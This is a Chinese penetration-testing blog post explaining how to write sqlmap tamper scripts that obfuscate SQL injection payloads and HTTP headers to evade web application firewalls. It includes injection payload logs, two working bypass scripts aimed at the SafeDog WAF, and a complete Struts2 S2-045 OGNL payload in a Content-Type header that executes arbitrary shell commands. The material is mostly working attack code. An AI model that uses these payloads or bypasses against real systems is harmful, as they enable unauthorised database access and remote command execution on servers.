---
date: "2017-06-08T00:00:00Z"
description: 本文简述SQLMAP的tamper编写步骤
title: 如何编写Sqlmap的Tamper脚本?
url: /archivers/2017-06-08/1
---
本文简述SQLMAP的tamper编写步骤
<!--more-->

* 目录
{:toc}

## 0x00 前言

前段时间发布了几篇Bypass的文章，包括脚本的免杀、请求分析、WAF的特性、Bypass原理...
我的微信：Guest_Killer_0nlis

* [渗透测试中的Bypass技巧（一）](https://zhuanlan.zhihu.com/p/25549356)
* [渗透测试中的Bypass技巧（二）](https://zhuanlan.zhihu.com/p/25585517)
* [自动化注入Bypass（附自动化sqlmap bypass tamper）](https://zhuanlan.zhihu.com/p/25678670)
* [自动化注入Bypass 2（附自动化sqlmap bypass tamper）](https://zhuanlan.zhihu.com/p/25724834)

这些文章中的亮点无非就是那两个`tamper`啦！

今天带大家从基本的走起：

* 0x00 前言
* 0x01 Tamper的主要作用
* 0x02 Tamper简单结构概述
* 0x03 Tamper的几个玩法
* 0x04 最后的吐槽！

## 0x01 Tamper的主要作用

其实一个简单的Tamper能够帮助我们修改`Payload`，修改请求头中的`Header`值，从而绕过IDS/WAF的检测。

> 这里的`Payload`就是指我们的每一个检测注入的SQL，在注入的时候我们可以加上`-v 3`参数来查看`Payload`。

它共有七个等级，默认为1：

* 0、只显示python错误以及严重的信息。
* 1、同时显示基本信息和警告信息。（默认）
* 2、同时显示debug信息。
* 3、同时显示注入的payload。
* 4、同时显示HTTP请求。
* 5、同时显示HTTP响应头。
* 6、同时显示HTTP响应页面。

> 这里的`Header`就是我们的每一个请求头，在注入的时候我们可以加上`-v 4`参数来查看`Header`。

在调用`Tamper`之前我们要考虑当前数据库的版本、类型，然后再去选择合理的`Tamper`。

假设我有一个MySQL数据库的注入点，WAF检测`UNION`关键字如果有空格，就会被当作一个SQL攻击请求，从而把你给拦截了。
那么真的就没有办法了吗？

在MySQL语句中，我们可以通过`/*!UNION*/`或者`/**/UNION/**/` Agian or `UniOn`....都可以正常执行，前提是你必须了解各个数据库的特性。
就拿MySQL来说，它不区分大小写，那么我们传递的值有时候也可以通过大小写混淆的方式去绕过检测。

> 这些思路都是根据一个个基础知识通过构思、一个想法而产生的，然后再通过动手去实践想法，得出结论，最后产生“姿势”。 
> 你不缺乏想象力，你只是基础知识太弱。      - 倾旋

那么说了这么多，其实可以总结出：调用Tamper的条件就是必须能保证我们的SQL执行后与我们的期望结果相同。
意思也就是要满足数据库能够正常运行SQL(排除报错注入)。

## 0x02 Tamper简单结构概述

```py
#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
    pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    return payload
```

今天主要来讲tamper这个函数，总共两个参数。

`payload`主要是传递过来的是每个检测SQL注入的Payload，建议读者先找一个注入点测试并添加上`-v 3`参数，查看Payload体验一下。

> SQL Injection:http://192.168.1.149/sqli/example1.php?name=root

部分日志：

```
[14:00:27] [PAYLOAD] 5444
[14:00:27] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:27] [INFO] confirming that GET parameter 'name' is dynamic
[14:00:27] [PAYLOAD] 6230
[14:00:27] [INFO] GET parameter 'name' is dynamic
[14:00:27] [PAYLOAD] root),)."")','
[14:00:27] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
[14:00:27] [PAYLOAD] root'jQBnEm<'">IXWAcV
[14:00:27] [INFO] testing for SQL injection on GET parameter 'name'
[14:00:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:00:28] [PAYLOAD] root) AND 1494=5040 AND (7286=7286
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root) AND 6033=6033 AND (6260=6260
[14:00:28] [PAYLOAD] root AND 9786=3346
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root AND 6033=6033
[14:00:28] [PAYLOAD] root') AND 7485=8545 AND ('IUCd'='IUCd
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.634
[14:00:28] [PAYLOAD] root') AND 6033=6033 AND ('qlLE'='qlLE
[14:00:28] [PAYLOAD] root' AND 5621=6946 AND 'OKld'='OKld
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root' AND 6033=6033 AND 'HFDv'='HFDv
[14:00:28] [PAYLOAD] root' AND 9642=7321 AND 'reXb'='reXb
```
我们此时站在自动化检测工具的角度去分析这个注入点

首先判断这个参数的值是整数型还是字符型，因为在数据库中，要进行条件匹配、逻辑运算的话，字符是要被双引号包裹起来的，而整数不用。

### Example：
> SELECT * FROM user WHERE username = 'root'
> SELECT * FROM user WHERE uid = 1
> SELECT * FROM user WHERE uid ='1' # 数字字符遇到整数型字段会被自动转换

再看这一条：`[14:00:28] [PAYLOAD] root' AND 6033=6033 AND 'HFDv'='HFDv`，此时已经完全符合我们的要求了。
SQL语句如下：`SELECT * FROM user WHERE username='root' AND 6033=6033 AND 'HFDv'='HFDv'`

> 如果还不理解，你就要去看手工注入的知识了，没必要再向下阅读了。

## 0x03 Tamper的几个玩法

到了重头戏了，我们来自己写几个Tamper，然后去分析我之前写过的Tamper，还是很好理解的！

本文中涉及的技术并没有多么深，你只需要有手工注入的基础、Python的字符串简单操作即可写出自己的Tamper。

首先举个例子，假设我们有一个加工厂，这个加工厂的产品需要经过三个流程，`进货`、`加工`、`包装`、`出售`。但是我们的货物我们不需要去包装就可以直接出售给客户。

> 这里的货物就是我们的SQL注入点，你可以把它当作一个向服务器端发送的请求。

> 这个进货的操作就是我们将检测目标传递给自动化注入工具的过程了。

> 加工就是自动化注入工具进行分析、构造合适的Payload。

> 假设这个货物要被包装才可以出售(调用了 --tamper参数)，那么我们的加工材料(Payload)就会经过我们的包装车间(tamper函数),为了兼容不同的产品，所以根据产品的个数设立了可变的车间(payload参数和**kwargs参数)。

> 最后的出售就是将加工好的产品(请求)卖给客户(存在注入点的服务器)。

整个tamper的作用就在这里，用于判断是否需要包装。

下面我根据刚才这个例子来写一个简单的包装车间(tamper)：

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):# tamper函数体内你可以把payload和kwargs当作已经传递进来的值
    payload = payload.replace(" ","/**/") # 将空格替换为/**/
    print payload #适当的还可以直接输出，不使用-v参数了。
    return payload #必须返回最后的Payload
```
我们将上面的代码保存为tamperdeomo.py放到sqlmap的tamper目录中。
然后试着调用这个脚本
> sqlmap -u http://192.168.1.149/sqli/example1.php?name=root --tamper=tamperdemo

是不是很简单呢？

我们的第一个Tamper就大功告成了，可惜的是sqlmap官方提供的tamper中已经有了我们刚才写的功能，并且WAF大多没有那么低的level。

想要提升我们tamper的杀伤力和Level，首先你要了解Http相关的基础知识，以及正则表达式。

总之万变不离其宗，我们只要在最后返回Payload的值就可以了。

另一种玩法就是将我们请求的Header头进行一下篡改：

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    kwargs['headers']['X-Forwarded-For'] = '10.10.10.10' # 这里的kwargs是一个字典，读者可以直接print打印出来看看结构。
    payload = payload.replace(" ",'/**/')
    return payload
```

经常看HTTP数据包的读者肯定注意到了，kwargs['headers']对应我们的请求Header头，它是一个字典。

```python
kwargs['headers']['Content-type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+sys.argv[2]+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

kwargs['headers']['User-Agent']="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" # 修改User-Agent
```

也可以这么来执行`S2-045`……

当然也可以`import`其他模块进行操作，随心所欲 ～

下面分析我之前分享出来的两个bypass脚本：

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload,**kwargs):
    if payload:
		bypass_SafeDog_str = "/*x^x*/" # 一个干扰字符
		payload=payload.replace("UNION",bypass_SafeDog_str+"UNION"+bypass_SafeDog_str) # 在UNION的左右两边添加干扰字符
		payload=payload.replace("SELECT",bypass_SafeDog_str+"SELECT"+bypass_SafeDog_str) # 同上，
		payload=payload.replace("AND",bypass_SafeDog_str+"AND"+bypass_SafeDog_str) # 同上，
		payload=payload.replace("=",bypass_SafeDog_str+"="+bypass_SafeDog_str) # 将空格替换成干扰字符
		payload=payload.replace(" ",bypass_SafeDog_str)
		payload=payload.replace("information_schema.","%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/") # 将information_schema.这个关键字替换成URL编码后的内容
		payload=payload.replace("FROM",bypass_SafeDog_str+"FROM"+bypass_SafeDog_str) # 同样替换
		#print "[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version ."
		print payload # 输出Payload 
    return payload # 返回Payload
```


```python

#!/usr/bin/env python
import re
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW
def tamper(payload):
    if payload:
              pass
              payload = payload.replace("SLEEP(5)","\"0\" LikE Sleep(5)") # 将SLEEP(5)替换成"0" LIKE Sleep(5)，因为Sleep()函数执行后会返回0，0等于0就会返回true
       	      payload = payload.replace("","/*FFFFFFFFFFFFFFFFFFFFFFFFF*/") # 将空格替换
              p = re.compile(r'(\d+)=')
              payload=p.sub(r"'\1'LikE ", payload) #将数字附近的=替换成LikE
    return payload # 返回payload
```

## 0x04 最后的吐槽！

看了这么多例子，你是否有所收获呢？

因为在某社区看到有人高价出售tamper、过狗一句话……讲真，我看不起这种行为。

在挖掘防护产品有缺陷的时候请不要感觉自己多么厉害，也许是运气、偶然、实力。

不管以任何方式，都不能忘记初心。

每一个漏洞的公布，都会给这个时代的技术发展画上浓重的一笔。

再此，感谢云锁、安全狗在职的朋友们的鼓励与支持。















